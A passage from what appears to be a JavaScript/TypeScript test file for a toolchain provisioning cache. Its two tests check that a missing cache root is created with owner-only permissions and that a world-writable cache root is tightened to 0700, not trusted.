  test("a cache root that does not exist yet is a miss, not a crash", async () => {
    // The first provision on a machine runs before anything has created it.
    const h = harness();
    const cacheRoot = join(tempDir("ompd-cache-"), "nested", "toolchain");
    const resolved = await provision(h, cacheRoot);

    expect(resolved.cached).toBe(false);
    expect(statSync(resolved.toolsDir ?? "").isDirectory()).toBe(true);
    expect(statSync(cacheRoot).mode & 0o777).toBe(0o700);
  });

  test("a cache root left world-writable is tightened, not trusted", async () => {
    // The root cannot simply be rejected: unlike an entry it holds nothing whose
    // contents could be verified instead, and refusing has no recovery path. It
    // is repaired on every provision, because it is where the staging directory
    // is made and where the rename lands.
    const cacheRoot = tempDir("ompd-cache-");
    chmodSync(cacheRoot, 0o777);

    const resolved = await provision(harness(), cacheRoot);
    expect(statSync(cacheRoot).mode & 0o777).toBe(0o700);
    expect(resolved.cached).toBe(false);
  });
});
